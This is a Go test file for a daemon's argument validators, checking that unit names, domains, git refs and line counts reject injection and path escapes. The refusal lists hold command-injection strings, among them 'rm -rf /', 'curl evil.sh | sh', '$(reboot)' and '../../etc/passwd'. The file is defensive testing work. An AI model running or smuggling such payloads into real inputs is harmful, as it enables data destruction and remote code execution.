package capability

import "testing"

// The argument helpers are the last gate before exec. Everything they let
// through becomes a real argv entry on a real machine, so the cases that must
// fail are worth more tests than the ones that must pass.

func TestUnitRejectsAnythingThatIsNotAUnitName(t *testing.T) {
	refused := []string{
		"",
		"nginx; rm -rf /",
		"nginx && curl evil.sh | sh",
		"nginx\nsystemctl stop sshd",
		"../../etc/passwd",
		"$(reboot)",
		"`reboot`",
		"nginx|tee",
		"nginx > /etc/passwd",
		"ngin x",
	}
	for _, raw := range refused {
		if _, err := (Args{"unit": raw}).Unit(); err == nil {
			t.Errorf("accepted %q as a unit name", raw)
		}
	}
}

func TestUnitAcceptsRealNamesAndNamesThem(t *testing.T) {
	for raw, want := range map[string]string{
		"nginx":         "nginx.service",
		"nginx.service": "nginx.service",
		"my-app":        "my-app.service",
		"getty@tty1":    "getty@tty1.service",
		"docker.socket": "docker.socket",
	} {
		got, err := (Args{"unit": raw}).Unit()
		if err != nil {
			t.Fatalf("%q was refused: %v", raw, err)
		}
		if got != want {
			t.Errorf("%q became %q, wanted %q", raw, got, want)
		}
	}
}

func TestAnOverLongUnitIsRefused(t *testing.T) {
	long := ""
	for i := 0; i < 100; i++ {
		long += "a"
	}
	if _, err := (Args{"unit": long}).Unit(); err == nil {
		t.Error("accepted a 100-character unit name")
	}
}

func TestDomainRejectsWhatIsNotADomain(t *testing.T) {
	for _, raw := range []string{"", "example.com/../etc", "example com", "EXAMPLE.COM;ls", "a@b.com"} {
		if _, err := (Args{"domain": raw}).Domain(); err == nil {
			t.Errorf("accepted %q as a domain", raw)
		}
	}
	if got, err := (Args{"domain": "  Example.COM "}).Domain(); err != nil || got != "example.com" {
		t.Errorf("got %q (%v), wanted example.com", got, err)
	}
}

func TestRefRejectsShellAndPathEscapes(t *testing.T) {
	for _, raw := range []string{"", "main; rm -rf /", "main$(id)", "main|sh", "main branch"} {
		if _, err := (Args{"ref": raw}).Ref(); err == nil {
			t.Errorf("accepted %q as a git ref", raw)
		}
	}
	for _, raw := range []string{"main", "v1.2.3", "feature/checkout", "a3f9c2d"} {
		if _, err := (Args{"ref": raw}).Ref(); err != nil {
			t.Errorf("refused %q: %v", raw, err)
		}
	}
}

func TestLinesIsBoundedBothWays(t *testing.T) {
	if got := (Args{}).Lines(50, 200); got != 50 {
		t.Errorf("missing lines gave %d, wanted the fallback 50", got)
	}
	if got := (Args{"lines": float64(100000)}).Lines(50, 200); got != 200 {
		t.Errorf("an enormous request gave %d, wanted the cap 200", got)
	}
	if got := (Args{"lines": float64(-5)}).Lines(50, 200); got != 50 {
		t.Errorf("a negative request gave %d, wanted the fallback", got)
	}
	if got := (Args{"lines": "200"}).Lines(50, 200); got != 50 {
		t.Errorf("a string gave %d, wanted the fallback", got)
	}
}

func TestRegistryHasNoCapabilityThisBuildCannotRun(t *testing.T) {
	for name, spec := range Registry() {
		if spec.Run == nil {
			t.Errorf("%s has no implementation", name)
		}
		if spec.Name != name {
			t.Errorf("%s is filed under %s", spec.Name, name)
		}
		if spec.Tier != TierRead && spec.Tier != TierReversible {
			t.Errorf("%s has tier %q", name, spec.Tier)
		}
	}
}

func TestNothingDestructiveIsCompiledIn(t *testing.T) {
	// The far side never sends these. If one were ever added here, a breach of
	// the far side would be able to reach it — so the absence is asserted.
	for _, name := range []string{
		"db.drop", "volume.delete", "firewall.set", "ssh.keys",
		"agent.permissions", "shell.run",
	} {
		if Known(name) {
			t.Errorf("%s is implemented in the daemon and must not be", name)
		}
	}
}
